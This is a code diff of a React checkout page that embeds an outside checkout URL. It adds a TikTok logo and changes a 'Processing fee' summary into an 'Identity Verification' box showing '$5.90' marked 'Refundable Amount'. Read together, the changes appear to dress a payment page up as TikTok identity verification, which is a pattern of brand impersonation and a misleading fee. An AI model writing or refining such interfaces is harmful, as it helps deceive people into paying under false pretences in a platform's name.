@@ -1,11 +1,11 @@
 import { useEffect, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
+import tiktokLogo from "@/assets/tiktok-logo.png";
 
 const CHECKOUT_BASE_URL = "https://checkout.cooud.com/01KH52NHC02W9XP6SGHQ1DAMXK";
 
 const TOP_CROP = 302;
 const BOTTOM_CROP = 9500;
-const FEE_SECTION_HEIGHT = 140; // altura da seção de taxa
 
 const Index = () => {
   const [searchParams] = useSearchParams();
@@ -36,52 +36,89 @@ const Index = () => {
         height: "100vh",
         display: "flex",
         flexDirection: "column",
-        backgroundColor: "#fff",
+        backgroundColor: "#f5f5f5",
       }}
     >
-      {/* Seção de resumo do pedido */}
+      {/* Header com logo e resumo */}
       <div
         style={{
           width: "100%",
-          padding: "20px 24px",
-          borderBottom: "1px solid #e5e7eb",
-          backgroundColor: "#fafafa",
           flexShrink: 0,
+          display: "flex",
+          flexDirection: "column",
+          alignItems: "center",
+          paddingTop: "28px",
+          paddingBottom: "24px",
+          backgroundColor: "#fff",
+          borderBottom: "1px solid #eee",
         }}
       >
-        <h2
+        {/* Logo TikTok */}
+        <img
+          src={tiktokLogo}
+          alt="TikTok"
           style={{
-            fontSize: "16px",
-            fontWeight: 700,
-            color: "#111",
-            marginBottom: "14px",
-            letterSpacing: "-0.01em",
+            height: "32px",
+            objectFit: "contain",
+            marginBottom: "24px",
           }}
-        >
-          Order Summary
-        </h2>
+        />
+
+        {/* Card de resumo */}
         <div
           style={{
-            display: "flex",
-            justifyContent: "space-between",
-            alignItems: "center",
-            marginBottom: "10px",
+            width: "90%",
+            maxWidth: "400px",
+            backgroundColor: "#fafafa",
+            borderRadius: "12px",
+            padding: "20px 24px",
+            border: "1px solid #f0f0f0",
           }}
         >
-          <span style={{ fontSize: "14px", color: "#555" }}>Processing fee</span>
-          <span style={{ fontSize: "14px", color: "#555" }}>R$ 5,90</span>
-        </div>
-        <div
-          style={{
-            borderTop: "1px solid #e5e7eb",
-            paddingTop: "10px",
-            display: "flex",
-            justifyContent: "space-between",
-            alignItems: "center",
-          }}
-        >
-          <span style={{ fontSize: "15px", fontWeight: 600, color: "#111" }}>Total</span>
-          <span style={{ fontSize: "15px", fontWeight: 600, color: "#111" }}>R$ 5,90</span>
+          <span
+            style={{
+              fontSize: "11px",
+              fontWeight: 600,
+              letterSpacing: "0.08em",
+              color: "#6b7280",
+              textTransform: "uppercase" as const,
+            }}
+          >
+            Identity Verification
+          </span>
+          <div
+            style={{
+              display: "flex",
+              alignItems: "center",
+              gap: "12px",
+              marginTop: "10px",
+            }}
+          >
+            <span
+              style={{
+                fontSize: "28px",
+                fontWeight: 700,
+                color: "#111",
+                letterSpacing: "-0.02em",
+              }}
+            >
+              $5.90
+            </span>
+            <span
+              style={{
+                fontSize: "11px",
+                fontWeight: 600,
+                letterSpacing: "0.04em",
+                color: "#10b981",
+                backgroundColor: "#ecfdf5",
+                padding: "4px 10px",
+                borderRadius: "20px",
+                textTransform: "uppercase" as const,
+              }}
+            >
+              Refundable Amount
+            </span>
+          </div>
         </div>
       </div>
 
